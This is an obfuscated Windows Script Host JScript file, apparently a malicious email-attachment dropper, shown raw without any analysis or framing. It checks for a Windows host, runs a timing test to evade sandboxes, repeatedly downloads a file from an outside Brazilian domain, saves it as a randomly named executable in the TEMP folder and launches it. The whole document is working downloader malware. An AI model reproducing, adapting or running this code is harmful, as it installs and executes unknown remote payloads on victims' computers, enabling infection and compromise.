var do0 = false;
var T = "CreateObject";
var os = function i() {return WScript[T]("WScript.Shell");}(), O = 11;
var lp = "MSXML2.XMLHTTP";
var W = 2123213;
var v = 0;
function Q(T1){os["Run"](T1, v, v);};
function AK(){return "" + lp;};
function xE(Z, J){v = v * 1; return Z - J;};
function KW(){return T;};
/*@cc_on
  @if (@_win32 || @_win64)
    do0 = true;
  @end
@*/
if (do0)
{
var bM = "";
function Is(){return 22;};
var l0 = 0; var UZ = 0;
function f()
{
var r = new this["Date"]();
var t = r["getUTCMilliseconds"]();
WScript["Sleep"](Is());
var r = new this["Date"]();
var LU = r["getUTCMilliseconds"]();
WScript["Sleep"](Is());
var r = new this["Date"]();
var T0 = r["getUTCMilliseconds"]();
var l0 = "q";
l0 = xE(LU, t);
var UZ = "XT";
UZ = xE(T0, LU);
bM = "open";
return xE(l0, UZ);
}
var wx = false;
var K = false;
for (var RM = v; RM < Is() * 1; RM++){if (f() != v){
wx = true; 
UZ = "31" + 11 * l0 + UZ; 
K = true; 
break;
}}
function qF() {return ((wx == true) && (wx == K)) ? 1 : v;};
if (wx && qF() && K){
function Xu() {return os["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "bD4FtHZEKvIEnhLc.exe";};
 PY = AK();
 Ah = WScript[T](PY);
 var dI = 1;
 while (dI){
try {
Ah[bM]("GET", "http://caferacerpneus.com.br/lw2osd", false);
Ah["send"]();
o = "Sleep";
for (;;){WScript[o](Is() * 11); if (Ah["readystate"] >= 2 * 2) break;};
dI = v;
} catch(r0){};
}
function l(Q0) {var a = (1, 2, 3, 4, 5, Q0); return a;};
ge = WScript[KW()]("ADODB.Stream");
PY = ge;
PY[bM]();
PY["type"] = l(1);
PY["write"](Ah["ResponseBody"]);
ge["position"] = l(v);
PY["Save" + "ToFile"](Xu(), 2);
ge["c"+"lose"]();
mJ = Xu();
Q(mJ);
}
}

